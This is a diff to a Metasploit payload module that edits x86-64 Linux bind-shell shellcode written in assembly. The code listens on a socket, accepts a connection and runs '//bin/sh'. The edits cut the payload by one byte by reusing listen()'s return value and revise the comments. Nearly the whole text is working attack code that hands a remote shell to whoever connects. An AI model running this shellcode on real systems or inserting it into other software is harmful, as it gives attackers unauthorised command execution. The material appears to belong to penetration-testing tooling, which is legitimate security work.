@@ -5,7 +5,7 @@
 
 module MetasploitModule
 
-  CachedSize = 52
+  CachedSize = 51
 
   include Msf::Payload::Single
   include Msf::Payload::Linux
@@ -55,9 +55,7 @@ module MetasploitModule
       ; int listen(int sockfd, int backlog);
       ; listen(sockfd, int);
 
-      ; listen arguments
-      push rdx      ; put zero into rsi
-      pop rsi
+      ; listen args ; just let rsi (backlog) as 1 - man(2) listen
 
       xchg eax, edi ; put the file descriptor returned by socket() into rdi
 
@@ -69,8 +67,9 @@ module MetasploitModule
       ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
       ; accept(sockfd, NULL, NULL)
 
-      ; accept args ; here we need only do nothing, the rdi already contains the sockfd,
-                    ; likewise rsi and rdx contains 0
+      ; accept args ; rdi already contains the sockfd, likewise rdx contains 0
+
+      xchg eax, esi ; put listen() return (0) into rsi
 
       mov al, 43    ; syscall 43 - accept
       syscall       ; kernel interruption
@@ -95,14 +94,14 @@ module MetasploitModule
 
       ; Finally, using execve to substitute the actual process with /bin/sh
       ; int execve(const char *filename, char *const argv[], char *const envp[]);
-      ; exevcve("/bin/sh", NULL, NULL)
+      ; exevcve("//bin/sh", NULL, NULL)
 
       ; execve string argument
                     ; *envp[] rdx is already NULL
                     ; *argv[] rsi is already NULL
       push rdx      ; put NULL terminating string
       mov rdi, 0x68732f6e69622f2f ; "//bin/sh"
-      push rdi      ; push /bin/sh string
+      push rdi      ; push //bin/sh string
       push rsp      ; push the stack pointer
       pop rdi       ; pop it (string address) into rdi
 
